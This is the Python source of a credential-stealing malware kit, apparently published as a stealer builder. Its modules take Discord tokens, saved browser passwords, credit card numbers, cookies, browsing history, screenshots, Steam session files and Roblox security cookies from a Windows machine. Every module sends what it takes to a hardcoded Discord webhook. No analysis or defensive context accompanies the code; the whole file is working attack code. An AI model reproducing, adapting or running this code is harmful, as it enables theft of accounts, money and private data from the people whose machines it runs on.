from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by SylexSquad* **|** ||https://github.com/sylexsquad||"""
                        payload = json.dumps({'content': embed, 'username': 'SylexPIP Grabber - Made by SylexSquad', 'avatar_url': 'https://cdn.discordapp.com/attachments/1055087022072680450/1086413304089550939/sylexsquad-2.png'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1086619351827894382/q5yTFAACloJK-1cx3DNu2Gvdmui_OYZlf6W--ZiuPE0GmRXNvQfDkWRHl3K_lBaCmZe6', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()




import os, requests, json, base64, sqlite3, shutil
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime

hook = "https://discord.com/api/webhooks/1086619351827894382/q5yTFAACloJK-1cx3DNu2Gvdmui_OYZlf6W--ZiuPE0GmRXNvQfDkWRHl3K_lBaCmZe6"

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def save_results(browser_name, data_type, content):
    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
        os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
    if content is not None:
        open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)

def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, user+'\\AppData\\Local\\Temp\\login_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\login_db')
    return result


def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name Card: {row[0]}
        Card Number: {card_number}
        Expires:  {row[1]} / {row[2]}
        Added: {datetime.fromtimestamp(row[4])}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
    return result


def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, user+'\\AppData\\Local\\Temp\\cookie_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
    return result


def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
        URL: {row[0]}
        Title: {row[1]}
        Visited Time: {row[2]}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
    return result


def get_downloads(path: str, profile: str):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        return
    result = ""
    shutil.copy(downloads_db, user+'\\AppData\\Local\\Temp\\downloads_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"""
        Download URL: {row[0]}
        Local Path: {row[1]}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')


def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results


if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))

        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))

        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))

        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))

        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
        shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')    
try:
 os.remove(user+'\\AppData\\Local\\Temp\\Browser')
except:
    pass
with open(user+'\\AppData\\Local\\Temp\\Browser.zip', "rb") as f:
 files = {"Browser.zip": (user+'\\AppData\\Local\\Temp\\Browser.zip', f)}
 r = requests.post(hook, files=files)
 try:
     os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
 except:
     pass




import os.path, requests, os
from PIL import ImageGrab

user = os.path.expanduser("~")

hook = "https://discord.com/api/webhooks/1086619351827894382/q5yTFAACloJK-1cx3DNu2Gvdmui_OYZlf6W--ZiuPE0GmRXNvQfDkWRHl3K_lBaCmZe6"

captura = ImageGrab.grab()
captura.save(user+"\\AppData\\Local\\Temp\\ss.png")

file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
r = requests.post(hook, files=file)
try:
 os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
except:
    pass



import os, os.path, zipfile, requests

hook = "https://discord.com/api/webhooks/1086619351827894382/q5yTFAACloJK-1cx3DNu2Gvdmui_OYZlf6W--ZiuPE0GmRXNvQfDkWRHl3K_lBaCmZe6"

steam_path = ""
if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
 steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
 ssfn = []
 config = ""
 for file in os.listdir(steam_path):
     if file[:4] == "ssfn":
         ssfn.append(steam_path+f"\\{file}")
     def steam(path,path1,steam_session):
            for root,dirs,file_name in os.walk(path):
                for file in file_name:
                    steam_session.write(root+"\\"+file)
            for file2 in path1:
                steam_session.write(file2)
     if os.path.exists(steam_path+"\\config"):
      with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                steam(steam_path+"\\config",ssfn,zp)
file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
r = requests.post(hook, files=file)
try:
 os.remove(f"{os.environ['TEMP']}\steam_session.zip")
except:
    pass
  
  
  
  
import requests, robloxpy, json, browser_cookie3, os.path

user = os.path.expanduser("~")

hook = "https://discord.com/api/webhooks/1086619351827894382/q5yTFAACloJK-1cx3DNu2Gvdmui_OYZlf6W--ZiuPE0GmRXNvQfDkWRHl3K_lBaCmZe6"

def robloxl():
    data = [] 

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')    
        for cookie in cookies:
            print(cookie)
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')    
        for cookie in cookies:
            print(cookie)
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                print("L")
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
cookiesrbx = robloxl()

def rbxsteal():
 roblox_cookie = cookiesrbx[1]
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
    isvalid = "Valid"
 else:
  exit()
 ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
 info = json.loads(ebruh.text)
 rid = info["UserID"]
 rap = robloxpy.User.External.GetRAP(rid)
 friends = robloxpy.User.Friends.External.GetCount(rid)
 age = robloxpy.User.External.GetAge(rid)
 dnso = None
 crdate = robloxpy.User.External.CreationDate(rid)
 rolimons = f"https://www.rolimons.com/player/{rid}"
 roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
 headshot = robloxpy.User.External.GetHeadshot(rid)
 limiteds = robloxpy.User.External.GetLimiteds(rid)

 username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
 result = open(user + "\\AppData\\Local\\Temp\\cookierbx.txt", "w")
 result.write(cookiesrbx[1])
 result.close()
 payload = {
    "embeds": [
        {
            "title": "Roblox Stealer!",
            "description": "Github.com/Lawxsz/make-u-own-stealer",
            "fields": [
         {
             "name": "Username",
             "value": username,
             "inline": True
         },
         {
             "name": "Robux Balance",
             "value": robux,
             "inline": True
         },
         {
             "name": "Premium",
             "value": premium,
             "inline": True
         },
         {
             "name": "Builders Club",
             "value": info["IsAnyBuildersClubMember"],
             "inline": True
         },
         {
             "name": "Friends",
             "value": friends,
             "inline": True
         },
         {
             "name": "Profile",
             "value": roblox_profile,
             "inline": True
         },
         {
             "name": "Age",
             "value": crdate,
             "inline": True
         },
            ]
        }
    ]
}
 
 headers = {
    'Content-Type': 'application/json'
}
 file = {"file": open(user+f"\\AppData\\Local\\Temp\\cookierbx.txt", 'rb')}

 r = requests.post(hook, data=json.dumps(payload), headers=headers)
 fil = requests.post(hook, files=file)

rbxsteal() 
